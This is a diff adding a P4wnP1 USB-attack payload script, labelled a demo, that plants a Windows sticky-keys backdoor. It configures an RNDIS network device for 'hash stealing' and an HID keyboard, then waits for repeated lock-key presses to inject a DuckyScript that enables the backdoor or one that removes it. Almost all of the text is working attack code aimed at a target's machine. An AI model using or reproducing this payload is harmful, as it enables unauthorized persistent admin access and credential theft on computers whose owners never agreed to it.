@@ -1,0 +1,40 @@
+# P4wnP1 demo payload by MaMe82
+# ==========================
+#
+# Sticky keys backdoor
+# - needs Admin privs
+# - multiple presses to numlock enable backdoor
+# - multiple presses to SCROLL disable backdoor
+
+USB_VID="0x1d6b"    # Vendor ID
+USB_PID="0x1004"    # Product ID
+USE_ECM=false       # we need no Linux/Mac networking
+USE_RNDIS=true      # RNDIS network device to enable hash stealing
+USE_HID=true        # HID keyboard to allow entering cracked password
+USE_UMS=false # enable USB Mass Storage
+
+lang="de" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+
+function onKeyboardUp()
+{
+
+
+	while $true; do
+                # Wait for keyboard trigger based on LED detection
+                # NUMLOCK, CAPSLOCK or SCROLLLOCK have to be pressed 6 times frequently (max 800ms between presses)
+                # in order to make the blocking 'key_trigger' command return
+                #
+                # key_trigger returns an exitcode representing the key (status LED) which has triggered
+                key_trigger
+
+                case "$?" in
+                        2)  cat $wdir/DuckyScripts/stickykey.duck | duckhid
+                            led_blink 1;;
+                        3)  cat $wdir/DuckyScripts/stickykey_remove.duck | duckhid
+                            led_blink 2;;
+                esac
+	done
+
+}
+
+
